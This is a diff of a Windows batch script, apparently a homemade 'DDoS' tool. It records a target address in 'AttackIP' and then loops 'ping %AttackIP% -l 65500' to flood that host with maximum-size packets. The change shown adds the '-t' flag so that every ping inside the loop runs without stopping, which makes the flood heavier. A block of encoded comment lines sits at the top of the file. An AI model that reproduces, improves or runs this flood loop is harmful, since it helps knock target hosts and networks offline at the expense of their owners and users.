@@ -58,7 +58,7 @@
 ::dhAmsQZ3MwfNWATElA==
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
-::dhA7pRFwIByZRRnk
+::dhA7pRFwIByZRRnkc
 ::Zh4grVQjdCyDJGyX8VAjFB5QRRCNAE+/Fb4I5/jHwfCCrB9QcMYQS8L806CyA+8e+kzocJIb02hmvO8DH1VdZhfL
 ::YB416Ek+ZW8=
 ::
@@ -84,7 +84,7 @@ echo IP: >> log.txt
 echo %AttackIP% >> log.txt
 pause
 goto Attacklaunch
-pause
+
 :Attacklaunch
 cls
 echo FINAL CHECK: ARE YOU SURE
@@ -98,5 +98,5 @@ pause goto DDos
 
 :DDos
 :loop
-ping %AttackIP% -l 65500 -w 1 -n 1
+ping %AttackIP% -l 65500 -t -w 1 -n 1
 goto :loop
